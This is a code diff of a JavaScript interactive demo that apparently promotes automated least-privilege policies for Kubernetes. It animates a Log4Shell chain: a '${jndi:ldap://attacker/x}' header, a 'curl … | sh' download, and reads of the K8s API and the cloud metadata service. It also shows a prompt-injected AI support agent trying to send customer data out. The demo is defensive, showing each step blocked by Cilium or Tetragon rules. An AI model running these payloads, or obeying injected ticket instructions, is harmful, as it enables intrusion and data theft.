+  return list.map(([t,st,n],i)=>{ const x=x0+i*(w+gap); return `<g class="pc ${st}"><rect x="${x}" y="${y}" width="${w}" height="22" rx="6"/><text x="${x+w/2}" y="${y+15}" text-anchor="middle">${t}</text></g>${n?nb(x+w-2,y-2,n):''}`; }).join(''); }
+function sceneA(kind,{steps=[],n=0,enforced=false,fresh=-1,tint=true,label}){
+  const N=AN[kind]; const [px,py,pw,ph]=A.pod; let s=DEFS;
+  if(tint) s+=`<rect x="6" y="6" width="348" height="278" rx="14" class="zone ${enforced?'ok':''}"/><text x="16" y="276" class="zl ${enforced?'ok':''}">${enforced?'LEAST PRIVILEGE · ENFORCED':'DEFAULT-ALLOW · EVERY PATH OPEN'}</text>`;
+  s+=`<rect x="${px}" y="${py}" width="${pw}" height="${ph}" rx="16" class="pod ${enforced?'on':''}"/><text x="${px+pw/2}" y="${py+ph-8}" text-anchor="middle" class="podl">${label}</text>`;
+  const chips={};
+  steps.forEach((st,i)=>{ if(i>=n) return; const [from,to,kind2,state]=st; const isNew=i===fresh;
+    if(to.startsWith('#')){ chips[to.slice(1)]=[state==='b'?'b':'a',i+1]; return; }
+    const a=from==='core'?A.core:N[from], b=to==='core'?A.core:N[to];
+    if(state==='b') s+=action(A.core,N[to],'atk',{n:i+1,fresh:isNew,stopAt:A.pod});
+    else s+=action(a,b,kind2,{n:i+1,fresh:isNew}); });
+  const pl=kind==='app'?[['sh'],['curl'],['root']]:[['sh'],['curl']];
+  s+=procs(pl.map(([t])=>[t,chips[t]?chips[t][0]:'',chips[t]?chips[t][1]:0]));
+  s+=`<g class="nd core"><circle class="bg" cx="${A.core[0]}" cy="${A.core[1]}" r="18"/><text x="${A.core[0]}" y="${A.core[1]+4}" text-anchor="middle">${kind==='app'?'java':'py'}</text></g><text x="${A.core[0]}" y="${A.core[1]+32}" text-anchor="middle" class="podl">${kind==='app'?'adservice':'support-agent'}</text>`;
+  s+=Object.values(N).map(([x,y,l,sub,ic,c])=>node(x,y,l,sub,ic,c)).join('');
+  return s; }
+const ATK=[['fe','core','run','r','Request arrives with <b>${jndi:ldap://attacker/x}</b> in a header','frontend → adservice:9555 is a path it really needs.'],
+  ['core','att','atk','a','Log4j calls <b>ldap://attacker:1389</b> and loads the attacker’s class','Remote code is now running inside adservice.','Cilium','adservice egress: kube-dns:53 only → DROP. The call never connects, so no attacker class is loaded.'],
+  ['core','#curl','','a','The attacker’s code runs <b>sh -c "curl … | sh"</b>','More tools are downloaded and started.','Tetragon','exec allow-list for adservice: 8 programs. sh -c curl is not one → blocked.'],
+  ['core','api','atk','a','It calls the <b>K8s API</b> with the pod’s service-account token','Read secrets, start new pods.','Cilium','kube-apiserver not in adservice egress → DROP.'],
+  ['core','rd','atk','a','It connects to <b>redis-cart:6379</b>','Every customer’s cart.','Cilium','redis-cart not in adservice egress → DROP.'],
+  ['core','#root','','a','It tries to become <b>root</b>','setuid, new capabilities.','securityContext','allowPrivilegeEscalation: false · capabilities: drop ALL.']];
+const AGA=[['fe','core','run','r','The agent reads a ticket with <b>hidden instructions</b>','Reading tickets is its job.'],
+  ['core','rd','alw','al','The model decides to follow them','The LLM API is in its profile, so the call is allowed. Judging content is the gateway’s job, not the kernel’s.'],
+  ['core','att','atk','a','It posts customer data to a <b>paste site</b>','paste.example.net:443','Cilium','egress: LLM API + mcp-tickets only → DROP.'],
+  ['core','#curl','','a','Its shell tool runs <b>curl … | sh</b>','Downloads and runs a script.','Tetragon','exec allow-list: python only → blocked.'],
+  ['core','api','atk','a','It reads <b>cloud credentials</b> from the metadata service','169.254.169.254','Cilium','169.254.169.254 not in its egress → DROP.']];
+
+// ---------- scene B: the namespace
+const BN={att:[40,40,'internet','','net','att'],api:[320,40,'K8s API','','api',''],fe:[40,150,'frontend','','app',''],dns:[74,246,'kube-dns','','app',''],
+  py:[182,246,'payment','','app',''],ck:[322,118,'checkout','','app',''],ct:[322,196,'cart','','app',''],rd:[268,246,'redis-cart','','db','']};
+const BP=[110,84,144,122], BC=[182,128];
+const NEED=[['fe','core'],['core','dns'],['fe','ck','M40 150 Q182 30 322 118'],['fe','ct','M40 150 Q130 240 322 196'],['ck','py','M322 118 Q300 230 182 246'],['ck','ct'],['ct','rd']];
+const EXC=['att','api','ck','ct','rd','py'];
+const pt=k=>k==='core'?BC:BN[k];
+function needE(cls='need',fresh=false){ return NEED.map(([a,b,d])=>{ if(d) return `<path d="${d}" class="e ${cls} ${fresh?'drawn':''}"/>`; const [x1,y1,x2,y2]=trim(pt(a),pt(b),a==='core'?20:17,b==='core'?20:17); return `<line x1="${x1}" y1="${y1}" x2="${x2}" y2="${y2}" class="e ${cls} ${fresh?'drawn':''}"/>`; }).join(''); }
+function excE(only){ return EXC.filter(k=>!only||only.includes(k)).map(k=>{ const [x1,y1,x2,y2]=trim(BC,BN[k],20,17); return `<line x1="${x1}" y1="${y1}" x2="${x2}" y2="${y2}" class="e ex"/>`; }).join(''); }
+function sceneB({tint='open',need=false,needFresh=false,exc=false,podOn=false,chips=null,dim=[],extra='',over=''}){
+  let s=DEFS;
+  if(tint) s+=`<rect x="6" y="6" width="348" height="278" rx="14" class="zone ${tint==='ok'?'ok':''}"/>`;
+  if(exc) s+=excE(exc===true?null:exc);
+  if(need) s+=needE('need',needFresh);
+  const [px,py,pw,ph]=BP; s+=`<rect x="${px}" y="${py}" width="${pw}" height="${ph}" rx="14" class="pod ${podOn?'on':''}"/><text x="${px+pw/2}" y="${py+ph-6}" text-anchor="middle" class="podl">adservice pod</text>`;
+  s+=`<g class="nd core"><circle class="bg" cx="${BC[0]}" cy="${BC[1]}" r="17"/><text x="${BC[0]}" y="${BC[1]+4}" text-anchor="middle">java</text></g>`;
+  if(chips) s+=chips;
+  s+=extra;
+  s+=Object.entries(BN).map(([k,[x,y,l,sub,ic,c]])=>node(x,y,l,sub,ic,c+(dim.includes(k)?' dimn':''))).join('');
+  return s+over; }
+const chipRow=(items)=>{ const w=42,gap=4,tot=items.length*w+(items.length-1)*gap,x0=182-tot/2; return items.map(([t,c],i)=>`<g class="pc ${c}"><rect x="${x0+i*(w+gap)}" y="160" width="${w}" height="20" rx="6"/><text x="${x0+i*(w+gap)+w/2}" y="174" text-anchor="middle">${t}</text></g>`).join(''); };
 
 // ---------- steps
+const seqLive=(L,s)=>{ const i=s.sel!=null?s.sel:s.n-1; if(i<0) return ''; const st=L[i], blocked=s.enf&&st[3]==='a'&&st[6];
+  const tag=blocked?['b','BLOCKED']:st[3]==='r'?['r','RUNS']:st[3]==='al'?['al','ALLOWED']:['a','SUCCEEDS'];
+  return `<span class="k ${tag[0]}">${i+1} · ${tag[1]}</span>${st[4]}<small>${st[5]}</small>${blocked?`<span class="rule"><i>${st[6]}</i>${st[7]}</span>`:''}`; };
+const trackHTML=(L,s)=>L.map((st,i)=>{ const done=i<s.n; const blocked=s.enf&&st[3]==='a'&&st[6]; const c=!done?'':blocked?'b':st[3]==='r'?'r':st[3]==='al'?'al':'a'; return `<button data-k="${i}" class="${c} ${(s.sel!=null?s.sel:s.n-1)===i?'cur':''}" ${done?'':'disabled'}>${i+1}</button>`; }).join('');
 const STAGES=['Namespace isolation · K8s API','Egress lock · internet','East-west · pod to pod','Inside the pod · programs, privileges'];
-const MET=[0,0,0,0,0,0,0,0,0,0];
 const STEPS=[
- { ch:'Problem', t:'One bug, full breach.', tag:'boutique · adservice', act:'Run the attack',
-   p:()=>`adservice is a Java service in boutique, a 12-service shop in our lab. Its logging library has a remote-code bug, <b>Log4Shell</b>.`,
-   init:()=>({n:0,run:false}),
-   svg:s=>{ const N=APP; let g=mesh(N)+pod('adservice pod',false); for(let i=0;i<s.n;i++){ const [a,b,c]=ATK[i]; g+=edge(N,a,b,c,{num:i+1,draw:i===s.n-1,mark:c}); } return g+nodes(N); },
-   live:s=>s.n?`<b>${s.n}.</b> ${ATK[s.n-1][3]}<br><span style="font-size:13px">${ATK[s.n-1][4]}</span>`:'Nothing stops it: <b class="bad">every path in the namespace is open.</b>',
-   done:s=>s.n>=6, run:(s,re)=>{ s.run=true; for(let i=1;i<=6;i++) later(i*900,()=>{ s.n=i; if(i===6) s.run=false; re(); }); },
-   end:s=>s.n>=6?'<b class="bad">Breach.</b> The bug is not the problem. The problem is that everything is allowed.':'',
-   det:()=>`<h4>The chain</h4><table>${ATK.map((a,i)=>`<tr><td>${i+1}</td><td>${a[3].replace(/<[^>]+>/g,'')}</td></tr>`).join('')}</table><h4>Why this one</h4><p>Log4Shell (CVE-2021-44228) hit almost every Java shop. It needs one outbound connection to work: the kind of path least privilege removes.</p>` },
- { ch:'Problem', t:'The engines are there. The rules aren’t.', tag:'boutique', act:'Why?',
-   p:()=>`Cilium and Tetragon are installed. <b>0 policies.</b> Why does almost nobody enforce?`,
+ { ch:'Problem', t:'One bug, full breach.',
+   p:()=>`adservice is a Java service in boutique, a 12-service shop in our lab. Its logging library has a remote-code bug: <b>Log4Shell</b>.`,
+   init:()=>({n:0,sel:null}), seq:ATK,
+   svg:s=>sceneA('app',{steps:ATK.map(x=>[x[0],x[1],x[2],'a']),n:s.n,fresh:s.n-1,label:'adservice pod'}),
+   live:s=>s.n?seqLive(ATK,s):'Nothing stands in the way: <b class="bad">every path in the namespace is open.</b>',
+   actl:s=>s.n===0?'Start the attack':s.n<6?`Next step › ${s.n+1}`:'Attack complete',
+   done:s=>s.n>=6, run:s=>{ s.n++; s.sel=null; },
+   end:s=>s.n>=6?'<b>The bug is not the problem. The problem is that everything is allowed.</b>':'',
+   det:()=>`<h4>The chain</h4><table>${ATK.map((a,i)=>`<tr><td>${i+1}</td><td>${a[4].replace(/<[^>]+>/g,'')}</td></tr>`).join('')}</table><h4>Why this attack</h4><p>Log4Shell (CVE-2021-44228) hit almost every Java shop. The exploit needs one outbound connection to the attacker: the kind of path least privilege removes.</p>` },
+ { ch:'Problem', t:'The engines are there. The rules aren’t.',
+   p:()=>`Cilium and Tetragon are installed in the cluster. <b>Zero policies.</b> Why does almost nobody enforce?`,
    init:()=>({r:0}),
-   svg:s=>{ const N=APP; const b=(x,y,t,k)=>`<g class="badge"><rect x="${x}" y="${y}" width="150" height="24" rx="7"/><text x="${x+9}" y="${y+16}">${t} <tspan class="k">✓ installed</tspan> · <tspan class="z">0 rules</tspan></text></g>`;
-     return mesh(N)+pod('adservice pod',false)+nodes(N)+b(8,8,'Cilium')+b(202,8,'Tetragon'); },
+   svg:s=>sceneB({exc:true,extra:'',over:`<g class="badge"><rect x="96" y="12" width="168" height="44" rx="8"/><text x="108" y="30">Cilium   <tspan class="k">installed</tspan> · <tspan class="z">0 rules</tspan></text><text x="108" y="47">Tetragon <tspan class="k">installed</tspan> · <tspan class="z">0 rules</tspan></text></g>`}),
    live:s=>s.r?`<div class="why3"><div><b>Knowledge</b><span>App, cluster and risk sit in three different teams.</span></div><div><b>Scale</b><span>84 decisions per namespace. Tens of thousands per company.</span></div><div><b>Change</b><span>A rule written by hand breaks the next release.</span></div></div>`:'',
-   done:s=>s.r>0, run:(s,re)=>{ s.r=1; re(); },
+   actl:s=>s.r?'Three reasons':'Why?', done:s=>s.r>0, run:s=>{ s.r=1; },
    end:s=>s.r?'<b>The missing piece is the decision, not the engine.</b>':'',
-   det:()=>`<h4>Benchmark</h4><p>Fairwinds 2024: 58% of organizations had no network policy on most of their workloads.</p><h4>Scale, for one company</h4><table><tr><td>12 workloads × 7 layers</td><td>84</td></tr><tr><td>× 50 namespaces</td><td>4,200</td></tr><tr><td>× 10 clusters</td><td>42,000</td></tr><tr><td>every release</td><td>re-check</td></tr></table><h4>Change</h4><p>v3: policy written by hand. v4: a new dependency (fraud-check). Nobody updated the policy: checkout down. Fix under pressure: roll back, everything open again.</p>` },
- { ch:'Solution', t:'Evidence in.', tag:'', act:'Collect the evidence',
-   p:()=>`The knowledge exists. It is scattered across four places that already describe every workload.`,
+   det:()=>`<h4>Benchmark</h4><p>Fairwinds 2024: 58% of organizations had no network policy on most of their workloads.</p><h4>Scale, one company</h4><table><tr><td>12 workloads × 7 layers</td><td>84</td></tr><tr><td>× 50 namespaces</td><td>4,200</td></tr><tr><td>× 10 clusters</td><td>42,000</td></tr><tr><td>every release</td><td>re-check</td></tr></table><h4>Change</h4><p>v3: policy written by hand. v4 adds fraud-check; nobody updated the policy: checkout down. Under pressure: roll back, everything open again.</p>` },
+ { ch:'Solution', t:'Evidence in.',
+   p:()=>`The knowledge exists, scattered across four places that already describe every workload.`,
    init:()=>({n:0}),
-   svg:s=>{ const N=APP; const SR=[['Git',6,6],['Hubble',94,6],['Tetragon',182,6],['K8s API',270,6]];
-     let g=(s.n>=4?'':mesh(N))+pod('adservice pod',false);
-     if(s.n>=1) g+=edge(N,'fe','java','need',{draw:s.n===1}); if(s.n>=2) g+=NEED.filter(([a,b])=>a!=='java'&&b!=='java').map(([a,b])=>edge(N,a,b,'need',{draw:s.n===2})).join('');
-     if(s.n>=4) g+=edge(N,'java','dns','need',{draw:true});
-     g+=nodes(N,{dim:s.n>=3?[]:[]});
-     if(s.n>=3) g+=`<g class="chipv ok"><rect x="150" y="166" width="44" height="16"/><text x="156" y="177">exec ✓</text></g>`;
-     g+=SR.map(([t,x,y],i)=>`<g class="src ${i<s.n?'on':''}"><rect x="${x}" y="${y}" width="84" height="22" rx="7"/><text x="${x+9}" y="${y+15}">${i<s.n?'✓ ':''}${t}</text></g>`).join('');
-     return g; },
-   live:s=>['Tap to read every source.','<b>Manifests:</b> frontend declares <code>AD_SERVICE_ADDR=adservice:9555</code>.','<b>Hubble:</b> 33,411 real connections recorded; frontend → adservice seen 144 times.','<b>Tetragon:</b> which programs adservice really starts: java, plus 6 from its startup script.','<b>K8s API:</b> platform needs: every pod resolves DNS, kubelet probes it.'][s.n],
-   done:s=>s.n>=4, run:(s,re)=>{ for(let i=1;i<=4;i++) later(i*900,()=>{ s.n=i; re(); }); },
-   end:s=>s.n>=4?'Green: what each workload <b>needs</b>, with proof.':'',
+   svg:s=>{ const SR=['Git','Hubble','Tetragon','K8s API'];
+     const src=SR.map((t,i)=>`<g class="src ${i<s.n?'on':''}"><rect x="${10+i*86}" y="8" width="80" height="22" rx="7"/><text x="${50+i*86}" y="23" text-anchor="middle">${i<s.n?'✓ ':''}${t}</text></g>`).join('');
+     const chips=s.n>=3?chipRow([['java','ok']]):'';
+     return sceneB({tint:s.n>=2?false:'open',exc:s.n<2,need:s.n>=2,needFresh:s.n===2,chips,over:src}); },
+   live:s=>['','<span class="k r">Git</span>frontend’s manifest declares <b>AD_SERVICE_ADDR = adservice:9555</b>.','<span class="k r">Hubble</span><b>33,411</b> real connections recorded. frontend → adservice seen 144 times.','<span class="k r">Tetragon</span>which programs adservice really starts: <b>java</b>, plus 6 from its startup script.','<span class="k r">K8s API</span>platform needs: every pod resolves <b>DNS</b>; kubelet probes it.'][s.n],
+   actl:s=>s.n<4?['Read Git','Read Hubble','Read Tetragon','Read the K8s API'][s.n]:'Evidence collected', done:s=>s.n>=4, run:s=>{ s.n++; },
+   end:s=>s.n>=4?'Green: what each workload <b>needs</b>, with proof behind every line.':'',
    det:()=>`<h4>Git · Deployment frontend</h4><pre>env:\n  - name: AD_SERVICE_ADDR\n    value: adservice:9555</pre><h4>Hubble · flows</h4><pre>frontend → adservice:9555  TCP  FORWARDED\n… 143 more in 33,411 recorded flows</pre><h4>Tetragon · process_exec</h4><pre>binary  /opt/java/openjdk/bin/java\nparent  AdService (entrypoint script)</pre><h4>K8s API · platform</h4><pre>every pod → kube-dns:53 UDP\nkubelet → adservice:9555 (health probe)</pre>` },
- { ch:'Solution', t:'Decide. Don’t just record.', tag:'boutique · decisions', act:'Decide',
-   p:()=>`Each path and program is checked against all the evidence. Seen once is not enough; it has to make sense.`,
-   init:()=>({d:false}),
-   svg:s=>{ const N=APP; let g=pod('adservice pod',false);
-     if(!s.d) g+=decided(N,false)+OUT.filter(k=>k!=='fe'&&k!=='dns').map(k=>edge(N,'java',k,'mesh')).join('');
-     else { g+=decided(N,true); const [x1,y1,x2,y2]=seg(APP,'sh','att'); g+=`<line x1="${x1}" y1="${y1}" x2="${x2}" y2="${y2}" class="e kept"/>`; }
-     g+=nodes(N);
-     if(s.d) g+=`<g class="chipv ok"><rect x="144" y="192" width="56" height="16"/><text x="150" y="203">java ✓</text></g><g class="chipv ask"><rect x="240" y="80" width="74" height="16"/><text x="244" y="91">sed, uname ?</text></g><g class="chipv no"><rect x="120" y="64" width="60" height="16"/><text x="125" y="75">kept out</text></g>`;
-     return g; },
-   live:s=>s.d?`<b class="ok">17 needed</b> (green) · <b class="bad">116 excess</b> (dashed) · <b class="warn">6 programs: a person decides</b> (not declared in the image) · <b class="bad">sh → 203.0.113.7: kept out</b>, never learned.`:'Before deciding: everything that was ever allowed or seen.',
-   done:s=>s.d, run:(s,re)=>{ s.d=true; re(); },
-   end:s=>s.d?'Bad behavior seen during learning never becomes policy.':'',
+ { ch:'Solution', t:'Decide. Don’t just record.',
+   p:()=>`Each path and program is checked against all the evidence. Seen once is not enough: it has to make sense.`,
+   init:()=>({d:0}),
+   svg:s=>{ const chips=s.d>=2?chipRow([['java ✓','ok'],['+6 ?','ask'],['sh','a']]):chipRow([['java','ok']]);
+     const kept=s.d>=2?(()=>{ const [x1,y1]=[224,170],[x2,y2]=[54,52]; return `<line x1="${x1}" y1="${y1}" x2="${x2}" y2="${y2}" class="e kept"/><g class="flag"><rect x="52" y="98" width="72" height="18" rx="5"/><text x="88" y="111" text-anchor="middle">KEPT OUT</text></g>`; })():'';
+     return sceneB({tint:false,need:true,exc:s.d>=1,chips,extra:kept}); },
+   live:s=>['','<span class="k a">116 EXCESS</span>Paths that are allowed today but <b>never declared and never used</b>. They will be closed.','<span class="k al">17 NEEDED</span>stay open. <span class="k" style="background:var(--warn);color:var(--bg)">6 ASK</span>programs from the startup script go to a person. <span class="k a">KEPT OUT</span><b>sh → 203.0.113.7</b> was seen once while learning: not the app’s binary, no manifest, no DNS name. Never learned.'][s.d],
+   actl:s=>s.d<2?['Find the excess','Check what was seen'][s.d]:'Decided', done:s=>s.d>=2, run:s=>{ s.d++; },
+   end:s=>s.d>=2?'Bad behavior seen during learning never becomes policy.':'',
    det:()=>`<h4>adservice · paths</h4><table><tr><td>IN frontend :9555</td><td class="g">CONFIRMED · manifest + 144 flows</td></tr><tr><td>IN kubelet :9555</td><td class="g">NEEDED · platform</td></tr><tr><td>OUT kube-dns :53</td><td class="g">NEEDED · platform</td></tr><tr><td>OUT 11 workloads</td><td class="x">EXCESS · 0 flows, not declared</td></tr><tr><td>IN 10 workloads</td><td class="x">EXCESS · 0 flows, not declared</td></tr></table><h4>adservice · programs</h4><table><tr><td>AdService, /bin/sh</td><td class="g">declared in the image</td></tr><tr><td>java, sed, uname, tr, xargs, echo</td><td class="y">started by the script · a person confirms</td></tr></table><h4>Kept out</h4><pre>/bin/sh → 203.0.113.7:443  seen 1×\nnot the app binary · no manifest · no DNS name\n→ flagged, never allowed</pre>` },
- { ch:'Solution', t:'Proven before it’s applied.', tag:'replay · 33,411 real connections', act:'Replay the traffic',
+ { ch:'Solution', t:'Proven before it’s applied.',
    p:()=>`Every recorded connection runs through the new policy, offline. If one the app needs would drop, nothing is applied.`,
    init:()=>({st:0,miss:false}),
-   svg:s=>{ const N=APP; let g=decided(N,false)+pod('adservice pod',false)+nodes(N);
-     if(s.st===1) g+=NEED.map(([a,b],i)=>{ const [x1,y1,x2,y2]=seg(N,a,b); return `<circle r="3.5" class="dot"><animate attributeName="cx" from="${x1}" to="${x2}" dur="0.9s" begin="${i*.12}s" repeatCount="indefinite"/><animate attributeName="cy" from="${y1}" to="${y2}" dur="0.9s" begin="${i*.12}s" repeatCount="indefinite"/></circle>`; }).join('');
-     if(s.miss) g+=blocked(N,'fe','java',{green:false});
-     return g; },
-   live:s=>s.st===0?'':s.st===1?'Replaying 33,411 connections…':s.miss?'<b class="bad">frontend → adservice would drop: 144 real requests fail.</b><br>Result: <b class="bad">FAIL · not applied</b>. Nothing in production changed.':'<b class="ok">PASS.</b> Every needed connection still works. The 116 paths it closes carried no traffic at all.',
-   act2:s=>s.st>=2?(s.miss?'Back to the real policy':'What if frontend was missed?'):null,
-   done:s=>s.st>=2, run:(s,re)=>{ if(s.st>=2){ s.miss=!s.miss; re(); return; } s.st=1; re(); later(2200,()=>{ s.st=2; re(); }); },
+   svg:s=>{ let dots=''; if(s.st===1&&!reduce) dots=NEED.map(([a,b,d],i)=>{ const p=d||`M${pt(a)[0]} ${pt(a)[1]} L${pt(b)[0]} ${pt(b)[1]}`; return `<circle r="4" class="pk"><animateMotion dur="1.1s" begin="${i*.14}s" repeatCount="indefinite" path="${p}"/></circle>`; }).join('');
+     let ex=''; if(s.miss){ const [x1,y1,x2,y2]=trim(BN.fe,BC,17,20); const mx=(x1+x2)/2,my=(y1+y2)/2; ex=`<line x1="${x1}" y1="${y1}" x2="${x2}" y2="${y2}" class="e atk"/>`+xmark(mx,my,false,true); }
+     return sceneB({tint:false,need:true,chips:chipRow([['java ✓','ok']]),extra:dots+ex}); },
+   live:s=>s.st===0?'':s.st===1?'Replaying <b>33,411</b> recorded connections against the new policy…':s.miss?'<span class="k a">FAIL</span><b>frontend → adservice would drop: 144 real requests fail.</b><small>The policy is not applied. Nothing in production changed.</small>':'<span class="k b">PASS</span>Every needed connection still works.<small>The 116 paths it closes carried no traffic at all.</small>',
+   actl:s=>s.st===0?'Replay the traffic':s.st===1?'Replaying…':s.miss?'Back to the real policy':'What if frontend was missed?',
+   done:s=>s.st>=2, busy:s=>s.st===1, run:(s,re)=>{ if(s.st>=2){ s.miss=!s.miss; return; } s.st=1; later(2600,()=>{ s.st=2; re(); }); }, sticky:true,
    end:s=>'',
-   det:()=>`<h4>decision-layer verify adservice --replay</h4><pre>replaying 33,411 Hubble flows\n\nfrontend → adservice:9555   kept ×144\nkubelet  → adservice:9555   kept ×583\nguard: kube-dns:53          kept\nunused paths                21 closed\n\nRESULT  PASS</pre><h4>Same check for programs</h4><pre>exec replay: every program seen at startup\nis on the allow-list → container still starts</pre>` },
- { ch:'Proof', t:'Enforce in stages.', tag:'boutique · enforcement', act:'Approve stage 1',
+   det:()=>`<h4>decision-layer verify adservice --replay</h4><pre>replaying 33,411 Hubble flows\n\nfrontend → adservice:9555   kept ×144\nkubelet  → adservice:9555   kept ×583\nguard: kube-dns:53          kept\nunused paths                21 closed\n\nRESULT  PASS</pre><h4>Same check for programs</h4><pre>exec replay: every program seen at startup\nis on the allow-list → the container still starts</pre>` },
+ { ch:'Proof', t:'Enforce in stages.',
    p:()=>`Each stage is applied only after approval, checked live, and rolled back in one step.`,
    init:()=>({k:0}),
-   svg:s=>{ const N=APP; let g=pod('adservice pod',s.k>=4);
-     g+=NEED.map(([a,b])=>edge(N,a,b,'need')).join('');
-     if(s.k<3) g+=['fe','ck','ct','rd','py'].filter(k=>k!=='fe').map(k=>edge(N,'java',k,'ex')).join('');
-     if(s.k<1) g+=edge(N,'java','api','ex'); else g+=blocked(N,'java','api',{});
-     if(s.k<2) g+=edge(N,'java','att','ex'); else g+=blocked(N,'java','att',{});
-     g+=nodes(N,{dim:s.k>=4?['sh','root']:[]});
-     return g; },
-   live:s=>`${STAGES.map((t,i)=>`<div style="display:flex;justify-content:space-between;font-size:13px;padding:2px 0;${i<s.k?'color:var(--ok)':i===s.k?'color:var(--ink);font-weight:700':'color:var(--dim)'}"><span>${i+1}. ${t}</span><span>${i<s.k?'✓ live check: 0 drops':i===s.k?'next':''}</span></div>`).join('')}`,
-   actl:s=>s.k<4?`Approve stage ${s.k+1}`:'All stages enforced',
-   done:s=>s.k>=4, run:(s,re)=>{ if(s.k<4){ s.k++; re(); } },
+   svg:s=>{ let ex=''; const blockAt=(k)=>{ const [x1,y1,x2,y2]=trim(BC,BN[k],20,17); const [bx,by]=exitRect(x1,y1,x2,y2,BP); return xmark(bx,by,true,true); };
+     const exc=s.k<3?EXC.filter(k=>(k!=='api'||s.k<1)&&(k!=='att'||s.k<2)):[];
+     if(s.k>=1) ex+=blockAt('api'); if(s.k>=2) ex+=blockAt('att');
+     const chips=s.k>=4?chipRow([['java ✓','ok'],['sh','b'],['curl','b']]):chipRow([['java ✓','ok']]);
+     return sceneB({tint:s.k>=3?'ok':false,need:true,exc:exc.length?exc:false,podOn:s.k>=4,chips,extra:ex}); },
+   live:s=>`<div class="stg">${STAGES.map((t,i)=>`<div class="${i<s.k?'d':i===s.k?'n':'w'}"><span>${i+1}. ${t}</span><span>${i<s.k?'✓ 0 drops':i===s.k?'next':''}</span></div>`).join('')}</div>`,
+   actl:s=>s.k<4?`Approve stage ${s.k+1}`:'All stages enforced', done:s=>s.k>=4, run:s=>{ s.k++; },
    end:s=>'',
    det:()=>`<h4>Stage 3 · CiliumNetworkPolicy (generated)</h4><pre>kind: CiliumNetworkPolicy\nspec:\n  endpointSelector: {matchLabels: {app: adservice}}\n  ingress:\n  - fromEndpoints: [{matchLabels: {app: frontend}}]\n    toPorts: [{ports: [{port: "9555"}]}]\n  egress:\n  - toEndpoints: [{matchLabels: {k8s-app: kube-dns}}]\n    toPorts: [{ports: [{port: "53", protocol: UDP}]}]</pre><h4>Stage 4 · Tetragon + securityContext</h4><pre>exec allow-list: 8 programs (Tetragon)\nallowPrivilegeEscalation: false\ncapabilities: drop [ALL]</pre><h4>Rollback</h4><p>Each stage is its own policy set. A drop on a required flow rolls it back automatically.</p>` },
- { ch:'Proof', t:'Same attack, again.', tag:'boutique · enforced', act:'Run the attack again',
-   p:()=>`Same Log4Shell request. The bug is still in the code.`,
-   init:()=>({ph:0,n:0}),
-   svg:s=>{ const N=APP; let g=NEED.map(([a,b])=>edge(N,a,b,'need')).join('')+pod('adservice pod',true);
-     if(s.n>=1) g+=edge(N,'fe','java','run',{num:1,mark:'run'});
-     if(s.n>=2) g+=blocked(N,'java','att',{num:2});
-     if(s.ph>=2) for(let i=2;i<6;i++){ const [a,b]=ATK[i]; g+=blocked(N,a,b,{num:i+1}); }
-     return g+nodes(N); },
-   live:s=>{ if(s.ph>=2) return `Even if it got in another way, <b>every next step is blocked</b>:<span class="r"><i>Tetragon</i>curl not on the exec allow-list</span><span class="r"><i>Cilium</i>K8s API, redis-cart not in egress</span><span class="r"><i>securityContext</i>no privilege escalation</span>`;
-     if(s.n>=2) return `<b>Stopped at step 2.</b> Log4j's call out never connects, so no attacker code is loaded.<span class="r"><i>Cilium</i>adservice egress: kube-dns:53 only → DROP</span>`; return ''; },
-   act2:s=>s.ph===1&&s.n>=2?'What if it got in anyway?':null,
-   done:s=>s.n>=2, run:(s,re)=>{ if(s.ph===1){ s.ph=2; re(); return; } s.ph=1; later(500,()=>{ s.n=1; re(); }); later(1500,()=>{ s.n=2; re(); }); },
+ { ch:'Proof', t:'Same attack, again.',
+   p:()=>`The same Log4Shell request. The bug is still in the code.`,
+   init:()=>({n:0,sel:null,enf:true,all:false}), seq:ATK,
+   svg:s=>{ const steps=ATK.map((x,i)=>[x[0],x[1],x[2],i===0?'r':'b']); const n=s.all?6:Math.min(s.n,2);
+     return sceneA('app',{steps,n,fresh:s.all?-1:s.n-1,enforced:true,label:'adservice pod · enforced'}); },
+   live:s=>{ if(!s.n) return ''; if(s.all&&s.sel==null) return `Even if it got in another way, <b>every next step is blocked</b> by a specific rule.<small>Tap a number under the map.</small>`; const r=seqLive(ATK,s); return r+(s.n>=2&&!s.all&&s.sel==null?'<small><b class="ok">Stopped at step 2.</b> No attacker code ever runs.</small>':''); },
+   track:s=>s.all?ATK.length:Math.min(s.n,2),
+   actl:s=>s.n===0?'Run the attack again':s.n===1?'Next step › 2':!s.all?'What if it got in anyway?':'All steps blocked',
+   done:s=>s.n>=2, run:s=>{ if(s.n<2){ s.n++; } else s.all=true; s.sel=null; }, sticky:true,
    end:s=>'',
-   det:()=>`<h4>The rules that stopped it</h4><table>${ATK.slice(1).map((a,i)=>`<tr><td>${i+2}. ${a[5]}</td><td>${a[6]}</td></tr>`).join('')}</table>` },
- { ch:'Why now', t:'An agent can ignore its instructions. Not the kernel.', tag:'support-agent · AI agent', act:'Send the injected ticket',
-   p:()=>`An AI agent with a model API, a ticket tool and a shell tool. Its profile is built from its own config.`,
-   init:()=>({n:0}),
-   svg:s=>{ const N=AGT; let g=pod('support-agent pod',true)+edge(N,'fe','java','need')+edge(N,'java','ck','need')+edge(N,'java','dns','need');
-     for(let i=0;i<s.n;i++){ const [a,b,c]=AGA[i]; g+= c==='atk'?blocked(N,a,b,{num:i+1}):edge(N,a,b,c,{num:i+1,draw:i===s.n-1,mark:c}); }
-     g+=nodes(N,{dim:['root','ct','py','rd']});
-     g+=`<g class="badge"><rect x="8" y="8" width="230" height="24" rx="7" class="ag"/><text x="16" y="24">profile from agent config: model · mcp-tickets</text></g>`;
-     return g; },
-   live:s=>s.n?`<b>${s.n}.</b> ${AGA[s.n-1][3]}<br><span style="font-size:13px">${AGA[s.n-1][4]}</span>${AGA[s.n-1][5]?`<span class="r"><i>${AGA[s.n-1][5]}</i>${AGA[s.n-1][6]}</span>`:''}`:'A ticket arrives through its MCP tool.',
-   done:s=>s.n>=5, run:(s,re)=>{ for(let i=1;i<=5;i++) later(i*1100,()=>{ s.n=i; re(); }); },
-   end:s=>s.n>=5?'The model was fooled. Nothing it tried left the pod. Content misuse through the allowed API is the gateway’s job.':'',
